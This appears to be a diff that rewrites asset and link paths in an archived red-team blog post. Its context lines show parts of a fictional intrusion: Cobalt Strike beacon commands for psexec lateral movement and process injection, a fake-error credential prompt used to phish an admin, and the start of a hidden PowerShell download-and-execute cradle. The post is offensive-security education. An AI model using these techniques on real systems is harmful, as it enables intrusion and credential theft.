@@ -5,14 +5,14 @@
     <meta name="description" content="Offensive Security Engineering &amp; Shenanigans">
     <meta name="Author" content="Rasta Mouse">
     <meta name="keywords" content="offensive security red team pentesting">
-    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
-    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/syntax.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/style.css>
     <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
     <title>Cheesy Rumbles</title>
   </head><body><aside id="sidenav">
     <header>
     
-        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        <a href=https://rastamouse.me><img src="/rastamouse.me-old_blog/avatar.png" alt="avatar"></a>
         
     
 
@@ -26,7 +26,7 @@
     <nav>
         
             		
-            <a href="/"
+            <a href="/rastamouse.me-old_blog/"
                 
             >
                 <i class="fas fa-home fa-sm"></i>
@@ -34,7 +34,7 @@
             </a>
         
             		
-            <a href="/blog/"
+            <a href="/rastamouse.me-old_blog/blog/"
                 
             >
                 <i class="fas fa-keyboard fa-ms"></i>
@@ -42,7 +42,7 @@
             </a>
         
             		
-            <a href="/tags"
+            <a href="/rastamouse.me-old_blog/tags"
                 
             >
                 <i class="fas fa-tags fa-ms"></i>
@@ -70,7 +70,7 @@
             </a>
         
             		
-            <a href="/index.xml"
+            <a href="/rastamouse.me-old_blog/index.xml"
                 
             >
                 <i class="fas fa-rss fa-ms"></i>
@@ -101,7 +101,7 @@
 <h2 id="foothold">Foothold</h2>
 <p>We&rsquo;ll start with a session as the user <code>awhitehead</code>.  Note that everything you see here are fictional representations.</p>
 <figure>
-    <img src="/images/psexec/1-foothold.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/1-foothold.png"/> 
 </figure>
 
 <h2 id="situational-awareness">Situational Awareness</h2>
@@ -196,11 +196,11 @@ PromptOnSecureDesktop       : 1  ---&gt;  This policy will force all UAC prompts
 <p>I use a <a href="https://github.com/rasta-mouse/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1#L19-L21">modified version</a> of <a href="https://twitter.com/@enigma0x3">Matt Nelson&rsquo;s</a> <a href="https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1">Invoke-LoginPrompt</a>.  The only difference being that mine will pop an error message before prompting for creds - choosing something believable may increase the chance of them submitting without too much fuss.  Also, prompting for their standard account password (e.g. to reconnect Outlook) is easier to fool them into inventing a reason why they&rsquo;d need to enter creds for their admin account.</p>
 <pre><code>beacon&gt; powershell Invoke-LoginPrompt
 </code></pre><p><figure>
-    <img src="/images/psexec/2-fake-error.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/2-fake-error.png"/> 
 </figure>
 
 <figure>
-    <img src="/images/psexec/3-login-prompt.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/3-login-prompt.png"/> 
 </figure>
 </p>
 <pre><code>UserName                   Domain                     Password                 
@@ -256,7 +256,7 @@ C:\Windows\system32&gt;powershell.exe -nop -w hidden -c &quot;iex ((new-object n
 </code></pre><pre><code>beacon&gt; link 127.0.0.1
 [+] established link to child beacon: 172.16.0.201
 </code></pre><figure>
-    <img src="/images/psexec/4-foothold-elevate.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/4-foothold-elevate.png"/> 
 </figure>
 
 <h2 id="lateral-movement">Lateral Movement</h2>
@@ -264,17 +264,17 @@ C:\Windows\system32&gt;powershell.exe -nop -w hidden -c &quot;iex ((new-object n
 <p>As it currently stands I have no way of moving laterally across the workstations, but the members of <code>Desktop Support</code> do because they are local admins.  What I could do, is break an application (or carry out some other action) on <code>WKSTN-01</code> so that <code>awhitehead</code> needs to contact the support team for assistance.  They may then remote over to the workstation, where I can hijack their credentials or running process.</p>
 <p><code>awhitehead</code> is offered remote assistance by <code>Kiera Wilson (Admin)</code>, to which he accepts.</p>
 <figure>
-    <img src="/images/psexec/5-offerra.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/5-offerra.png"/> 
 </figure>
 
 <p>Keira will ask Andrew to allow her to respond to UAC prompts, which he will dutifully do.</p>
 <figure>
-    <img src="/images/psexec/6-offerra.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/6-offerra.png"/> 
 </figure>
 
 <p>Keira will then use her credentials to elevate on <code>WKSTN-01</code>, so she can carry out her investigations / fixes.</p>
 <figure>
-    <img src="/images/psexec/7-offerra.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/7-offerra.png"/> 
 </figure>
 
 <p>We now have <code>keira_adm</code> authenticated and running elevated processes on the compromised workstation.</p>
@@ -297,7 +297,7 @@ beacon&gt; psexec_psh wkstn-02 smb
 beacon&gt; inject 3220 http
 </code></pre><p><code>3220</code> was the pid of explorer running as <code>kwilson</code>.  I also rearranged my beacons to the following.</p>
 <figure>
-    <img src="/images/psexec/8-kwilson.png"/> 
+    <img src="/rastamouse.me-old_blog/images/psexec/8-kwilson.png"/> 
 </figure>
 
 <p>I purposely didn&rsquo;t continue using <code>kwilson_adm</code> on <code>WKSTN-01</code> - if I want to reuse her credentials to take the workstation of another privileged user, it will look more natural coming from <code>WKSTN-02</code> than <code>01</code>.  The same reason that once I took <code>WKSTN-02</code> from <code>WKSTN-01</code>, I terminated the connection. You wouldn&rsquo;t normally see connections going <code>01 -&gt; 02</code> but rather <code>02 -&gt; 01</code>.</p>
@@ -357,13 +357,13 @@ Credentials:
     <div class="nav-next-prev">
         <div class="nav-prev">
             
-                <a href="https://rastamouse.me/blog/playing-with-cuckoo/"><i class="fas fa-chevron-left"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/playing-with-cuckoo/"><i class="fas fa-chevron-left"></i></a>
             
         </div>
         <a class="nav-top" href="#">top</i></a>
         <div class="nav-next">
             
-                <a href="https://rastamouse.me/blog/anti-virus/"><i class="fas fa-chevron-right"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/anti-virus/"><i class="fas fa-chevron-right"></i></a>
             
         </div>
     </div>
@@ -378,5 +378,5 @@ Credentials:
 </div>
 </footer></main>
     </body>
-    <script src=https://rastamouse.me/js/navbutton.js></script>
+    <script src=/rastamouse.me-old_blog/js/navbutton.js></script>
 </html>
